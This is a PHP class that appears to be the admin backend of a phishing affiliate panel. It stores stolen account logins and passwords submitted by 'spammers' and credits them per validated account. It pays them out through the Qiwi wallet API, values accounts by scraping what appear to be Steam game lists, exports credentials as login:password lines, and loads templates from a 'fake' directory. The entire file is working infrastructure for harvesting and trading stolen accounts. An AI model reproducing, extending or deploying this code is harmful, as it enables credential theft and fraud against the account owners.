<?php
require_once("classDB.php");
require_once("classQiwiApi.php");
require_once("simple_html_dom.php");

define("QIWI_TOKEN", "");

	class classPanel {
		private $db;
		
		function __construct(){
			$this->db = new DB();
		}
		
		function b_AccountsExist($spammer = null){
			if ($spammer == null) $res = $this->db->countAllRows("accounts");
			else $res = $this->db->countRows(
					"accounts", 
					array(
						array("spammer", "=", $spammer)
					)
				);
			return ($res > 0);
		}
		
		function b_SpammersExist(){
			return ($this->db->countAllRows("spammers") > 0);
		}
		
		function b_RequestsExist(){
			$res = $this->db->countRows(
				"spammers", 
				array(
					array("balance", ">", 0)
				)
			);
			return ($res > 0);
		}
		
		function b_CheckSpammerAcc($login){
			$res = $this->db->countRows(
				"spammers", 
				array(
					array("login", "=", $login)
				)
			);
			return ($res > 0);
		}
		
		function arr_GetSpammerByLogin($login){
			$res = $this->db->getRows(
				"spammers", 
				array (
					array("login", "=", $login)
				)
			);
			return $res[0];
		}
		
		function arr_GetSpammerById($id){
			$res = $this->db->getRows(
				"spammers", 
				array (
					array("id", "=", $id)
				)
			);
			return $res[0];
		}
		
		function arr_GetPayoutById($id){
			$res = $this->db->getRows(
				"payouts", 
				array (
					array("id", "=", $id)
				)
			);
			return $res[0];
		}
		
		function arr_GetPayoutsByLogin($login){
			return $this->db->getRows(
				"payouts", 
				array (
					array("login", "=", $login)
				)
			);
		}
		
		function b_CheckOnValidSpammerAcc($login, $pass){
			$res = $this->db->countRows(
				"spammers", 
				array(
					array("login", "=", $login), 
					array("password", "=", $pass)
				)
			);
			return ($res > 0);
		}
		
		function int_CountAccounts($spammer = null){
			if ($spammer == null) return $this->db->countAllRows("accounts");
			else {
				return $this->db->countRows(
					"accounts",
					array (
						array("spammer", "=", $spammer)
					)
				);
			}
		}
		
		function arr_GetAccounts($spammer = null) {
			if ($spammer == null) return $this->db->getListRows("accounts", false, "time");
			else {
				return $this->db->getListRows(
					"accounts", 
					false, 
					"time", 
					array (
						array("spammer", "=", $spammer)
					)
				);
			}
		}
		
		function arr_GetSpammers() {
			return $this->db->getListRows("spammers", false);
		}
		
		function void_TruncAccs() {
			$this->db->truncateTable("accounts");
		}
		
		function arr_GetSettings() {
			return $this->db->getListRows("settings");
		}
		
		function void_UpdateSettings($settings) {
			foreach ($settings as $name => $value) {
				if ($name == "settings") continue;
				$this->db->updateRow(
					"settings", 
					array (
						array("name", "=", $name)
					),
					array (
						array("value", "=", $value)
					)
				);
			}
		}
		
		function s_GetAdminLogin(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "admin_login")
				)
			);
			return $rows[0]["value"];
		}
		
		function s_GetAdminPassword(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "admin_password")
				)
			);
			return $rows[0]["value"];
		}
		
		function int_GetVisits(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "visits")
				)
			);
			return $rows[0]["value"];
		}
		
		function s_GetDefaultComment(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "default_comment")
				)
			);
			return $rows[0]["value"];
		}
		
		function s_GetPassPrefix(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "pass_prefix")
				)
			);
			return $rows[0]["value"];
		}
		
		function int_GetDefaultSum(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "default_sum")
				)
			);
			return $rows[0]["value"];
		}
		
		function int_GetProxyActivity(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "proxy_activity")
				)
			);
			return $rows[0]["value"];
		}
		
		function arr_GetProxies() {
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "proxy")
				)
			);
			return explode("\n", $rows[0]["value"]);
		}
		
		function int_GetTimerActivity(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "timer_activity")
				)
			);
			return $rows[0]["value"];
		}
		
		function int_GetTimerTime(){
			$rows = $this->db->getRows(
				"settings", 
				array (
					array("name", "=", "timer_date")
				)
			);
			return strtotime($rows[0]["value"]);
		}
		
		function void_resetVisits(){
			$this->db->updateRow(
				"settings", 
				array (
					array("name", "=", "visits")
				),
				array (
					array("value", "=", 0)
				)
			);
		}
		
		function b_checkAdmin($login, $pass){
			$admin_login = self::s_GetAdminLogin();
			$admin_password = self::s_GetAdminPassword();
			
			if ($login === $admin_login && $pass === $admin_password) return true;
			else return false;
		}
		
		function void_dropAccount($id){
			$this->db->deleteRow(
				"accounts", 
				array(
					array("id", "=", $id)
				)
			);
		}
		
		function void_dropSpammer($id){
			$this->db->deleteRow(
				"spammers", 
				array(
					array("id", "=", $id)
				)
			);
		}
		
		function b_newAccs($spammer = null) {
			if ($spammer == null) {
				if ($this->db->countRows(
						"accounts", 
						array(
							array("isnotificated", "=", 0)
						)
					)
				) return true;
				else return false;
			}
			else {
				$res = $this->db->countRows(
					"accounts", 
					array(
						array("isnotificated", "=", 0), 
						array("spammer", "=", $spammer)
					)
				);
				
				return ($res > 0);
			}
		}
		
		function void_setNotificated(){
			$this->db->updateRow(
				"accounts", 
				array(
					array("isnotificated", "=", 0)
				),
				array(
					array("isnotificated", "=", 1)
				)
			);
		}
		
		function void_AddSpammer($login, $pass){
			$this->db->addRow(
				"spammers", 
				array
				(
					array("login", "=", $login),
					array("password", "=", $pass),
					array("balance", "=", 0)
				)
			);
		}
		
		function arr_GetRequests(){
			return $this->db->getRows(
				"payouts", 
				array (
					array("state", "=", 0)
				)
			);
		}
		
		function void_AddRequest($login, $sum){
			$this->db->addRow(
				"payouts", 
				array
				(
					array("login", "=", $login),
					array("password", "=", $sum),
					array("state", "=", 0)
				)
			);
		}
		
		function int_CountRequests(){
			return $this->db->countRows(
				"payouts", 
				array(
					array("state", "=", 0)
				)
			);
		}
		
		function void_UpdateSpammer($login, $password = null, $ps = null, $balance = null){
			if ($password !== null) $params[] = ["password", "=", $password];
			if ($ps !== null) $params[] = ["qiwi", "=", $ps];
			if ($balance !== null) $params[] = ["balance", "=", $balance];
			
			$this->db->updateRow(
				"spammers", 
				array(
					array("login", "=", $login)
				),
				$params
			);
		}
		
		function void_resetBalance($id){
			$this->db->updateRow(
				"spammers", 
				array(
					array("id", "=", $id)
				),
				array(
					array("balance", "=", 0)
				)
			);
		}
		
		function void_SetPassword($id, $password){
			$this->db->updateRow(
				"accounts", 
				array(
					array("id", "=", $id)
				),
				array(
					array("password", "=", $password)
				)
			);
		}
		
		function void_SetKT($id, $kt){
			$this->db->updateRow(
				"accounts", 
				array(
					array("id", "=", $id)
				),
				array(
					array("kt", "=", $kt)
				)
			);
		}
		
		function void_AddToBalance($login, $adding){
			$spammer = self::arr_GetSpammerByLogin($login);
			
			$this->db->updateRow(
				"spammers", 
				array(
					array("login", "=", $login)
				),
				array(
					array("balance", "=", $spammer["balance"] + $adding)
				)
			);
		}
		
		function void_TakeFromBalance($login, $taking){
			$spammer = self::arr_GetSpammerByLogin($login);
			
			$this->db->updateRow(
				"spammers", 
				array(
					array("login", "=", $login)
				),
				array(
					array("balance", "=", $spammer["balance"] - $taking)
				)
			);
		}
		
		function void_ToggleValid($id){
			$rows = $this->db->getRows(
				"accounts", 
				array (
					array("id", "=", $id)
				)
			);
			$acc = $rows[0];
			
			if ($acc["status"] == 0) {
				$this->db->updateRow(
					"accounts", 
					array(
						array("id", "=", $id)
					),
					array(
						array("status", "=", 1)
					)
				);
				self::void_AddToBalance($acc["spammer"], self::int_GetDefaultSum());
			}
			else {
				$this->db->updateRow(
					"accounts", 
					array(
						array("id", "=", $id)
					),
					array(
						array("status", "=", 0)
					)
				);
				self::void_TakeFromBalance($acc["spammer"], self::int_GetDefaultSum());
			}
		}
		
		function void_PayoutOnQiwi($login, $comment) {
			$spammer = self::arr_GetSpammerByLogin($login);
			
			if (QIWI_TOKEN == "") {
				$this->db->updateRow(
					"payouts", 
					array
					(
						array("login", "=", $login)
					),
					array
					(
						array("state", "=", 1)
					)
				);
			}
			
			$Qiwi = new QiwiApi(QIWI_TOKEN);
			
			$queryParams = array(
				'id' => strval(1000 * time()),
				'sum' => array(
					'amount' => $spammer["balance"],
					'currency' => "643"
				), 
				'source' => 'account_643',
				'paymentMethod' => array(
					'type' => 'Account',
					'accountId' => "643"
				),
				'comment' => $comment,
				'fields' => array(
					'account' => $spammer["qiwi"]
				)
			);
			
			$sendMoney = $Qiwi->sendMoneyToQiwi($queryParams);
			
			$this->db->updateRow(
				"payouts", 
				array
				(
					array("login", "=", $login)
				),
				array
				(
					array("state", "=", 1)
				)
			);
			
			// self::void_UpdateSpammer($login, null, null, 0);
		}
		
		function void_OrderPayout($login) {
			$spammer = self::arr_GetSpammerByLogin($login);
		// print_r($login);
			$this->db->addRow(
				"payouts", 
				array
				(
					array("login", "=", $login),
					array("sum", "=", $spammer["balance"]),
					array("state", "=", 0)
				)
			);
			self::void_resetBalance($spammer["id"]);
		}
		
		function void_DenyPayout($id) {
			$payout = self::arr_GetPayoutById($id);
			$spammer = self::arr_GetSpammerByLogin($payout["login"]);
			
			$this->db->updateRow(
				"payouts", 
				array(
					array("id", "=", $id)
				),
				array(
					array("state", "=", 2)
				)
			);
			
			self::void_AddToBalance($spammer["login"], $payout["sum"]);
		}
		
		function s_GetQiwiBalance() {
			if (QIWI_TOKEN == "") return "";
			
			$Qiwi = new QiwiApi(QIWI_TOKEN);
			
			$balance = $Qiwi->getBalance();
			$balances = "";
			foreach ($balance as $value) {
				if ($value["balance"] != null){
					$balances .= $value["balance"]["amount"] . " ";
					switch ($value["balance"]["currency"]) {
						case 643: $balances .= "R"; break; 
						//case 840: $balances .= "USD"; break;
						case 978: $balances .= "EUR"; break;
					}
					$balances .= " ";
				}
				else $balances .= "0";
			}
			
			return $balances;
		}
		
		function int_getTotalSum(){
			return $this->db->getFieldSum(
				"payouts",
				"sum",
				array(
					array("state", "=", 0)
				)
			);
		}
		
		function s_parseGames($profile_link) {
			$profile = file_get_contents($profile_link . "/games/?tab=all");
			
			if ($profile == false) return "";
			
			$html = str_get_html($profile);
			$private = $html->find("div[class=profile_private_info]", 0)->innertext;
			
			if (strpos($private, "This profile is private.") === false) {
				$js = $html->find("script[language=javascript]", 0)->innertext;
				$js = ltrim($js);
				
				$symbol_pos = strpos($js, ";");
				$js = substr($js, 0, $symbol_pos);
				
				$encoded_games = str_replace("var rgGames = ", "", $js);
				$decoded_games = json_decode($encoded_games, true);
				
				$all_games = [];
				foreach($decoded_games as $key => $game) {
					$all_games[] = $game["name"];
				}
				
				return json_encode($all_games);
			}
			else return "";
		}
		
		public function s_TextView() {
			$accounts = self::arr_GetAccounts();
			$accs = "";
			for ($i = 0; $i < count($accounts); $i++){
				$accs .= $accounts[$i]["login"] . ":" . $accounts[$i]["password"] . ":" . "https://www.mfsa.info/mail/" . $accounts[$i]["login"] . ":" . $accounts[$i]["kt"] . "<br />";
			}
			return $accs;
		}
		
		public function arr_getTemplates() 
		{
			$dir = "../fake";
			$result = array();
			$root = scandir($dir); 
			foreach($root as $value) 
			{ 
				if($value === '.' || $value === '..') continue;
				else if(is_dir($dir."/".$value)) {
					if (strpos($value, "template") !== false)
						$result[] = $value;
					continue;
				}
			}
			return $result; 
		}

	}

?>